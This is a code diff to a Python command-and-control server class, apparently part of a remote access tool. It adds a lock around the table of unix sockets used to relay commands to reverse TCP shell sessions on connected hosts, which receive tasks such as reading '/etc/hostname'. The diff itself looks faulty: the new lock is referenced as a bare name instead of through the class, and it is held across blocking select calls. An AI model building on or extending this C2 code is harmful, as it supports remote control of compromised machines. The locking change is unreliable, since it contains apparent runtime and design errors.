@@ -169,6 +169,7 @@ class C2():
     _text_style = 'NORMAL'
     _prompt_color = 'WHITE'
     _prompt_style = 'BRIGHT'
+    _unix_mutex = threading.Lock()
 
     def __init__(self, host='0.0.0.0', port=1337, db=':memory:', silent=False):
         """
@@ -965,8 +966,9 @@ class C2():
             util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(session), color='white', style='normal')
             self.current_session._active.set()
             conn = None
-            if int(session) in self.unix_sockets:
-                conn = self.unix_sockets[int(session)]
+            with _unix_mutex:
+                if int(session) in self.unix_sockets:
+                    conn = self.unix_sockets[int(session)]
                
 
             return self.current_session.run(conn, cmd)
@@ -1038,7 +1040,8 @@ class C2():
                     server_socket.listen(1)
                     output += f"    Using socket: {SOCKET_PATH}\n"
                     # util.display(f"    Using socket: {SOCKET_PATH}\n", color='white', style='bright', end='')
-                    self.unix_sockets[int(session.id)] = server_socket
+                    with _unix_mutex:
+                        self.unix_sockets[int(session.id)] = server_socket
 
                     # Create socket with the hostname
                     hostname_task = globals()['c2'].database.handle_task({'task': 'cat /etc/hostname', 'session': int(session.id)})
@@ -1067,7 +1070,8 @@ class C2():
                     output += f"    Using socket: {SOCKET_PATH}\n"
                     # util.display(f"    Using socket: {SOCKET_PATH}\n", color='white', style='bright', end='')
 
-                    self.unix_sockets[hostname] = server_socket
+                    with _unix_mutex:
+                        self.unix_sockets[hostname] = server_socket
                     self.sessions[hostname] = session
 
                     output = f"Connected to host {str(hostname)}\n" + output
@@ -1160,33 +1164,34 @@ class C2():
     @util.threaded
     def serve_unix_sockets(self):
         while True:
-            data = None
-            conn = None
+            with _unix_mutex:
+                data = None
+                conn = None
 
-            # iterate the unix sockets looking for a command
-            for num, socket in self.unix_sockets.items():
-                # Use select to wait for a connection with a timeout
-                readable, _, _ = select.select([socket], [], [], 0.5)  # 1-second timeout
-                if not readable:
+                # iterate the unix sockets looking for a command
+                for num, socket in self.unix_sockets.items():
+                    # Use select to wait for a connection with a timeout
+                    readable, _, _ = select.select([socket], [], [], 0.5)  # 1-second timeout
+                    if not readable:
+                        continue
+
+                    conn, _ = socket.accept()
+
+                    data = conn.recv(1024).decode("utf-8")
+
+                    if readable:
+                        break
+                    
+                if data is None or conn is None:
+                    time.sleep(1)
                     continue
 
-                conn, _ = socket.accept()
+                self.process_unix(data, conn)
 
-                data = conn.recv(1024).decode("utf-8")
-
-                if readable:
-                    break
-                
-            if data is None or conn is None:
-                time.sleep(1)
-                continue
-
-            self.process_unix(data, conn)
-
-            try:
-                conn.close()
-            except:
-                pass
+                try:
+                    conn.close()
+                except:
+                    pass
 
 
     def run(self):
